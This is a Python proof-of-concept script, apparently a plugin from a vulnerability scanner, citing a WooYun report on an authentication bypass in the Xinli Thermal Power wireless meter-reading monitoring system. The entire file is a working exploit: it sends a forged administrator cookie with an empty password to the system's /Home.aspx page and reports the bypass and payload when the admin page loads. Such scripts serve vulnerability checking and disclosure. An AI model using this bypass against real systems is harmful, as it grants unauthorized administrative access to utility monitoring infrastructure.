#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 新力热电无线抄表监控系统绕过后台登录
referer: http://www.wooyun.org/bugs/wooyun-2016-0178117
author: Lucifer
description: 替换COOKIE可达到绕过登录的目的。
'''
import sys
import json
import requests


class wireless_monitor_priv_elevation_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "Cookie":"LoginName=admin; Unit_Or_Client=%e6%96%b0%e5%8a%9b%e7%83%ad%e7%94%b5; UserType=%e7%b3%bb%e7%bb%9f%e5%b7%a5%e7%a8%8b%e5%b8%88; UserName=null; user=LoginName=admin&password="
        }
        payload = "/Home.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if "无线抄表监控管理系统" in req.text:
                return "[+]存在新力热电无线抄表管理系统后台绕过...(高危)\tpayload: "+vulnurl+"\tpost: Cookie:"+json.dumps(headers["Cookie"])
            else:
                return "[-]no"
        except:
            return "[-] ======>连接超时"


if __name__ == "__main__":
    testVuln = wireless_monitor_priv_elevation_BaseVerify(sys.argv[1])
    testVuln.run()